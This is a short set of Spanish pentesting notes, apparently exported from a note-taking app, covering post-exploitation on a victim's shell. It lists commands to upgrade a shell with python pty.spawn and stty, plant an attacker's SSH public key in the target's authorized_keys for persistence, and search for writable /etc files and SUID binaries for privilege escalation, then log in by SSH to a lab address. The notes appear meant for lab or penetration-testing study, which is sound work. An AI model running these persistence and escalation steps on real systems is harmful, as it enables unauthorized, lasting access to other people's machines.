    <rich_text>Mirar la versión de python primero

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Para python3: python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
 
Para python2 en la shell de la victima: python2 -c 'import pty; pty.spawn("/bin/bash")'

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Después ctrl + z: stty raw -echo; fg

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Para poder usar clean y comandos: 
export TERM=xterm
export SHELL=/bin/bash

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>


ssh-keygen -t rsa -b 4096 -N "" -f ~/.ssh/id_rsa_pentest &amp;&amp; cat ~/.ssh/id_rsa_pentest.pub

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Este va en la Shell remota:, usamos la clave rsa que nos dio el anterior
mkdir -p ~/.ssh &amp;&amp; echo "TU_CLAVE_PUBLICA" &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Dio denegado, entonces toca trabajar con binarios: find /etc -writable -type f 2&gt;/dev/null

</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

Find / -perm -4000 2&gt;/dev/null
 
ssh -i ~/.ssh/id_rsa_pentest USUARIO@192.168.18.128


</rich_text>
